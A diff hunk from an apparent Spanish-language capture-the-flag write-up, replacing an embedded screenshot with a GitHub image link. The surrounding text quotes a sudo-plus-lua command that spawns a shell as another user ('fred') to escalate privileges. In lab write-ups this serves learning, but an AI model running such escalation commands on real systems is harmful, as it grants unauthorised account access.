@@ -97,7 +97,8 @@ ahora somos shaggy y entonces ahora buscamos como escalar y aparece "lua"
 lanzamos el comando así:
 > sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'
 
-![[usuario4.png]]
+![image](https://github.com/user-attachments/assets/edceb1df-b875-4ef1-be52-bc28155d47fc)
+
 
 somos fred
 
